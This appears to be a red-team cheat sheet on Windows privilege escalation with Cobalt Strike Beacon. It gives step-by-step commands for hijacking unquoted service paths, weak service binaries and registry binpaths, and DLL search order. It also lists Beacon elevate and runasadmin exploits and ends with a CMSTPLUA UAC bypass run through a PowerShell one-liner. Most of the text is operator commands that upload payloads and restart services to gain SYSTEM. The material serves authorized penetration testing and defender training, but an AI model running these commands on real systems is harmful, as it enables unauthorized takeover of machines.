# Privilege Escalation with CS

### Paths you can control

Look for paths you can control

Software installers commonly add their own paths _before_ the default ones. Inspect the `%PATH%`

This variable is constructed from two locations:

*   **User**

    These entries are read from the `HKEY_CURRENT_USER\Environment` registry key.  Each user on the computer can have a different path variable, which they are free to modify.
*   **Machine**

    These entries are read from the `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment` registry key.  Standard users cannot modify this.
* The PATH variable for user processes is a concatenation of the Machine + User paths, whereas system processes just use the Machine paths.  Path interception by the PATH variable \[[T1574.007](https://attack.mitre.org/techniques/T1574/007/)] occurs when additional directories get added to the machine's variable that are also writable by standard users.

```
env
cacls C:\Python313\Scripts\
```

* F: Full
* R: Read & execute
* C: Read, write, execute, & delete
* W: Write

#### Search Order Hijacking

```
cacls "C:\Program Files\Bad Windows Service\Service Executable"
C:\Program Files\Bad Windows Service\Service Executable NT AUTHORITY\Authenticated Users:(CI)(OI)F

cd C:\Program Files\Bad Windows Service\Service Executable
upload C:\Payloads\dns_x64.exe
mv dns_x64.exe cmd.exe
```

#### Unquoted Paths

```
sc_enum
cacls "C:\Program Files\Bad Windows Service"
C:\Program Files\Bad Windows Service NT AUTHORITY\Authenticated Users:(CI)(OI)F

cd C:\Program Files\Bad Windows Service
upload C:\Payloads\dns_x64.svc.exe
mv dns_x64.svc.exe Service.exe
sc_stop BadWindowsService
sc_start BadWindowsService
```

* If you do not have permission to start and stop the service, you will have to wait for the machine to reboot, or reboot it yourself :)&#x20;

#### Weak Service Permissions

The binary that a service runs may have a weak ACE applied that allows standard users to modify it.  The ACE may be explicitly set on the binary itself, or inherited from its parent directory.  An adversary can simply overwrite the original binary with their own, and the Service Control Manager will execute it the next time the service is started \[[T1574.010](https://attack.mitre.org/techniques/T1574/010/)].

```
cacls "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe"
C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe NT AUTHORITY\Authenticated Users:F

cd C:\Program Files\Bad Windows Service\Service Executable\
sc_stop BadWindowsService
upload C:\Payloads\BadWindowsService.exe
sc_start BadWindowsService
```

#### Enumerate Service Permissions Registry

```
# get permissions
powerpick Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService | fl
sc_stop BadWindowsService
cd C:\Temp
upload C:\Payloads\dns_x64.svc.exe
# get current bin path for service so we can restore later
sc_qc BadWindowsService
sc_config BadWindowsService C:\Temp\dns_x64.svc.exe 0 2
sc_start BadWindowsService
# restore the binpath 
sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2
```

There is a registry key, called _Performance_.  Discovered by [Clément Labro](https://itm4n.github.io/windows-registry-rpceptmapper-eop/), this key points to a DLL responsible for monitoring the performance of a service.  Since it's optional and more suitable for dev/test than prod, this is often not found in most service installations by default.  This means it can be added by an adversary without interfering with the service's normal operation.

### Elevation

When you need to go from medium integrity to high integrity process. Make sure you are in the local Administrators group first

```
whoami
```

Look at the bottom of the output to see which integrity you are in elevate

```
elevate [exploit] [listener]

Beacon Local Exploits
=====================

    Exploit                         Description
    -------                         -----------
    X cve-2020-0796                   SMBv3 Compression Buffer Overflow (SMBGhost) (CVE 2020-0796)
    X ms14-058                        TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)
    X ms15-051                        Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)
    X ms16-016                        mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)
    (USE) svc-exe                         Get SYSTEM via an executable run as a service
    (USE) uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)
    (USE) uac-token-duplication           Bypass UAC with Token Duplication
```

runasadmin

```
runasadmin [exploit] [command] [args]

Beacon Command Elevators
========================

    Exploit                         Description
    -------                         -----------
    X ms16-032                        Secondary Logon Handle Privilege Escalation (CVE-2016-099)
    (USE) uac-cmstplua                    Bypass UAC with CMSTPLUA COM interface
    (USE) uac-eventvwr                    Bypass UAC with eventvwr.exe
    (USE) uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)
    (USE) uac-token-duplication           Bypass UAC with Token Duplication
    (USE) uac-wscript                     Bypass UAC with wscript.exe
```

The flexibility of `runasadmin` means that you can execute any arbitrary command.

### DLL Search Order Hijacking <a href="#el_1735399171586_342" id="el_1735399171586_342"></a>

Typical search order

* The executing directory.
* The System32 directory.
* The 16-bit System directory.
* The Windows directory.
* The current working directory of the program.
* Directories in the PATH environment variable.

DLL search order hijacking is a technique \[[T1574.001](https://attack.mitre.org/versions/v16/techniques/T1574/001/)] where an adversary drops a malicious module of the same name in a directory that is higher in the search hierarchy than that of the legitimate module.  If the program loading the module is running with elevated privileges, then this will result in an elevation of privilege for the adversary.

```
cacls "C:\Program Files\Bad Windows Service\Service Executable"
C:\Program Files\Bad Windows Service\Service Executable NT AUTHORITY\Authenticated Users:(CI)(OI)F

cd C:\Program Files\Bad Windows Service\Service Executable
upload C:\Payloads\dns_x64.dll
mv dns_x64.dll BadDll.dll
```

#### CMSTPLUA UAC Bypass

For this bypass technique to work, the process in which our Beacon is running must live in _C:\Windows\*_.

1. spawn x64 http
2. Host powershell one liner Right-click the Beacon, select **Access > One-liner** and select the tcp-local listener.

```
runasadmin uac-cmstplua [ONE-LINER]
connect localhost 1337
```
